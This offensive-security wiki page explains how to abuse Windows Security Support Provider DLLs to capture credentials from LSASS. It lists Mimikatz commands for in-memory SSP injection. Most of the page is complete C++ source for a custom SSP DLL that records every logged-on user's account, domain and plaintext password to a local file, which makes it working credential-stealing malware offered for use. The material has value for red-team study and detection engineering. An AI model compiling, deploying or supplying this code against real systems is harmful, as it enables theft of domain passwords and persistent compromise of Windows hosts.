# Security Support Provider DLLs

## Theory

We may abuse [security support providers (SSPs)](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture) to injected into LSASS.exe process custom SSP DLLs. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.

## Practice

### In memory Loading

We may directly inject [SSP DLLs](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture) into memory. It prevent us from editing registries but using this approach, it will not persist accross reboot like with [this method](../../../../../windows/persistence/lsa/security-support-provider-dlls.md).

{% tabs %}
{% tab title="Mimikatz" %}
Mimikatz support in memory SSP DLL injection to the LSASS process.

```powershell
mimikatz# privilege::debug
mimikatz# misc::memssp
```
{% endtab %}

{% tab title="Custom DLL" %}
Below is the code, originally taken from [mimikatz](https://github.com/gentilkiwi/mimikatz), adapted and refactored, that we can compile as our own Security Support Provider DLL. It intercepts authenticatin details and saves them to a file `c:\temp\lsa-pwned.txt`:

{% code title="sspcustom.cpp" %}
```cpp
#include "stdafx.h"
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <iostream>
#pragma comment(lib, "Secur32.lib")

NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable) { return 0; }
NTSTATUS NTAPI SpShutDown(void) { return 0; }

NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)
{
	PackageInfo->Name = (SEC_WCHAR *)L"SSPCustom";
	PackageInfo->Comment = (SEC_WCHAR *)L"SSPCustom <o>";
	PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
	PackageInfo->wRPCID = SECPKG_ID_NONE;
	PackageInfo->cbMaxToken = 0;
	PackageInfo->wVersion = 1;
	return 0;
}

NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
	HANDLE outFile = CreateFile(L"c:\\temp\\lsa-pwned.txt", FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD bytesWritten = 0;
	
	std::wstring log = L"";
	std::wstring account = AccountName->Buffer;
	std::wstring domain = PrimaryCredentials->DomainName.Buffer;
	std::wstring password = PrimaryCredentials->Password.Buffer;

	log.append(account).append(L"@").append(domain).append(L":").append(password).append(L"\n");
	WriteFile(outFile, log.c_str(), log.length() * 2, &bytesWritten, NULL);
	CloseHandle(outFile);
	return 0;
}

SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] = 
{
	{
		NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,	SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL 
	}
};

// SpLsaModeInitialize is called by LSA for each registered Security Package
extern "C" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
	*PackageVersion = SECPKG_INTERFACE_VERSION;
	*ppTables = SecurityPackageFunctionTable;
	*pcTables = 1;
	return 0;
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Loading from disk - Persistence

{% content-ref url="../../../../../windows/persistence/lsa/security-support-provider-dlls.md" %}
[security-support-provider-dlls.md](../../../../../windows/persistence/lsa/security-support-provider-dlls.md)
{% endcontent-ref %}

## Resources

{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package" %}
